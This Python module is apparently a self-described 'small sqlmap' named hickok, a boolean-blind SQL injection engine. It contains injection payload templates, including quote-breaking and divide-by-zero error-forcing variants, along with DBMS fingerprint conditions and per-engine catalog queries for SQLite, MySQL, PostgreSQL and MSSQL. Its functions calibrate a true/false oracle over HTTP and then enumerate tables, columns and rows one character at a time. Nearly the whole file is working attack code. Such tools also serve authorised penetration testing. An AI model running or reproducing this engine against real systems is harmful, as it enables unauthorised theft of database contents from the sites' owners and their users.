"""Boolean-blind SQL injection engine — walk a database through a yes/no oracle.

Given an injectable parameter, hickok calibrates a TRUE/FALSE differential, finds
the DBMS, then reads anything one bit at a time: it asks the server thousands of
"is this condition true?" questions and binary-searches each value out. Enough to
fingerprint, enumerate tables/columns and dump rows — a small sqlmap.

Dependency-free (urllib). Boolean-blind only for now (the most universal case).
"""

from __future__ import annotations

import difflib
import urllib.error
import urllib.request
from urllib.parse import parse_qs, urlencode, urlsplit, urlunsplit

_UA = "hickok-sql/0.1"

# Injection contexts: how to wrap an arbitrary boolean condition C around the
# parameter's normal value V. The right one is found by calibration.
_CONTEXTS = [
    # Plain boolean — works when a false condition visibly changes the page.
    ("numeric",       "{v} AND ({c})-- -"),
    ("single-quote",  "{v}' AND ({c})-- -"),
    ("double-quote",  "{v}\" AND ({c})-- -"),
    ("paren-single",  "{v}') AND ({c})-- -"),
    # Error-forcing — a false condition divides by zero, so even when the page
    # barely changes on a false row, true (page) vs false (error) is night & day.
    ("numeric/error", "{v} AND (CASE WHEN ({c}) THEN 1 ELSE 1/0 END)=1-- -"),
    ("single/error",  "{v}' AND (CASE WHEN ({c}) THEN 1 ELSE 1/0 END)=1-- -"),
]

# DBMS detection — a condition true only on that engine.
_FINGERPRINT = [
    ("sqlite",   "sqlite_version() IS NOT NULL"),
    ("mysql",    "@@version_comment IS NOT NULL"),
    ("mssql",    "@@servername IS NOT NULL"),
    ("postgres", "(SELECT 1 FROM pg_catalog.pg_tables LIMIT 1)=1"),
]

# Per-DBMS query fragments. {q}=a sub-SELECT, {i}=1-based char index, {t}=table,
# {c}=column, {k}=0-based row offset. Each "*_at" returns the k-th item so the
# engine can page through lists; counts bound the loops.
_PROFILES = {
    "sqlite": {
        "charcode": "unicode(substr(({q}),{i},1))",
        "length":   "length(({q}))",
        "version":  "sqlite_version()",
        "user":     "''",
        "db":       "'main'",
        "tables_n": "(SELECT count(*) FROM sqlite_master WHERE type='table')",
        "table_at": "(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {k})",
        "cols_n":   "(SELECT count(*) FROM pragma_table_info('{t}'))",
        "col_at":   "(SELECT name FROM pragma_table_info('{t}') LIMIT 1 OFFSET {k})",
        "rows_n":   "(SELECT count(*) FROM {t})",
        "cell_at":  "(SELECT {c} FROM {t} LIMIT 1 OFFSET {k})",
    },
    "mysql": {
        "charcode": "ascii(substring(({q}),{i},1))",
        "length":   "length(({q}))",
        "version":  "@@version",
        "user":     "current_user()",
        "db":       "database()",
        "tables_n": "(SELECT count(*) FROM information_schema.tables WHERE table_schema=database())",
        "table_at": "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {k})",
        "cols_n":   "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}' AND table_schema=database())",
        "col_at":   "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' AND table_schema=database() LIMIT 1 OFFSET {k})",
        "rows_n":   "(SELECT count(*) FROM {t})",
        "cell_at":  "(SELECT {c} FROM {t} LIMIT 1 OFFSET {k})",
    },
    "postgres": {
        "charcode": "ascii(substr(({q}),{i},1))",
        "length":   "length(({q}))",
        "version":  "version()",
        "user":     "current_user",
        "db":       "current_database()",
        "tables_n": "(SELECT count(*) FROM information_schema.tables WHERE table_schema='public')",
        "table_at": "(SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {k})",
        "cols_n":   "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}')",
        "col_at":   "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' LIMIT 1 OFFSET {k})",
        "rows_n":   "(SELECT count(*) FROM {t})",
        "cell_at":  "(SELECT {c} FROM {t} LIMIT 1 OFFSET {k})",
    },
    "mssql": {
        "charcode": "unicode(substring(({q}),{i},1))",
        "length":   "len(({q}))",
        "version":  "@@version",
        "user":     "system_user",
        "db":       "db_name()",
        "tables_n": "(SELECT count(*) FROM information_schema.tables)",
        "table_at": "(SELECT table_name FROM information_schema.tables ORDER BY table_name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)",
        "cols_n":   "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}')",
        "col_at":   "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' ORDER BY column_name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)",
        "rows_n":   "(SELECT count(*) FROM {t})",
        "cell_at":  "(SELECT {c} FROM {t} ORDER BY 1 OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)",
    },
}


def _fetch(url: str, param: str, value: str, timeout: float = 15.0) -> str:
    """Send the request with `param` set to `value`; return the response body."""
    parts = urlsplit(url)
    q = {k: v[0] for k, v in parse_qs(parts.query, keep_blank_values=True).items()}
    q[param] = value
    target = urlunsplit(parts._replace(query=urlencode(q)))
    req = urllib.request.Request(target, headers={"User-Agent": _UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read(200_000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as exc:           # 4xx/5xx still carry a body
        return exc.read(200_000).decode("utf-8", "ignore")
    except Exception:
        return ""


class Oracle:
    """A yes/no question to the database: ask(condition) -> True/False."""

    def __init__(self, url, param, value, template, context, true_text, false_text):
        self.url, self.param, self.value = url, param, value
        self.template, self.context = template, context
        self._true, self._false = true_text, false_text
        self.count = 0

    def ask(self, condition: str) -> bool:
        self.count += 1
        body = _fetch(self.url, self.param, self.template.format(v=self.value, c=condition))
        return (difflib.SequenceMatcher(None, body, self._true).ratio()
                >= difflib.SequenceMatcher(None, body, self._false).ratio())


def _sim(a, b):
    return difflib.SequenceMatcher(None, a, b).ratio()


def calibrate(url, param, value):
    """Find an injection context where TRUE and FALSE give different responses."""
    for context, tmpl in _CONTEXTS:
        t = _fetch(url, param, tmpl.format(v=value, c="1=1"))
        f = _fetch(url, param, tmpl.format(v=value, c="1=2"))
        if t and _sim(t, f) < 0.95:                 # the condition visibly moves the page
            o = Oracle(url, param, value, tmpl, context, t, f)
            if o.ask("1=1") and not o.ask("1=2"):   # confirm the oracle is consistent
                return o
    return None


def fingerprint(oracle) -> str:
    for name, cond in _FINGERPRINT:
        if oracle.ask(cond):
            return name
    return "sqlite"        # safe fallback (ANSI-ish)


def extract_int(oracle, expr, cap=1 << 21) -> int:
    """The integer value of a SQL expression, by binary search on `>`/`>=`."""
    hi = 1
    while hi < cap and oracle.ask(f"({expr}) > {hi}"):
        hi <<= 1
    lo = 0
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle.ask(f"({expr}) >= {mid}"):
            lo = mid
        else:
            hi = mid - 1
    return lo


def extract_str(oracle, prof, subquery, maxlen=256) -> str:
    """The string value of a sub-SELECT, one character at a time."""
    n = min(extract_int(oracle, prof["length"].format(q=subquery)), maxlen)
    out = []
    for i in range(1, n + 1):
        code = extract_int(oracle, prof["charcode"].format(q=subquery, i=i))
        out.append(chr(code) if code else "?")
    return "".join(out)


def _list(oracle, prof, count_expr, at_tmpl, **fmt):
    n = extract_int(oracle, count_expr.format(**fmt))
    return [extract_str(oracle, prof, at_tmpl.format(k=k, **fmt)) for k in range(n)]


def tables(oracle, prof):
    return _list(oracle, prof, prof["tables_n"], prof["table_at"])


def columns(oracle, prof, table):
    return _list(oracle, prof, prof["cols_n"], prof["col_at"], t=table)


def dump(oracle, prof, table, cols, limit=20):
    rows_n = min(extract_int(oracle, prof["rows_n"].format(t=table)), limit)
    rows = []
    for k in range(rows_n):
        rows.append([extract_str(oracle, prof, prof["cell_at"].format(c=c, t=table, k=k)) for c in cols])
    return rows
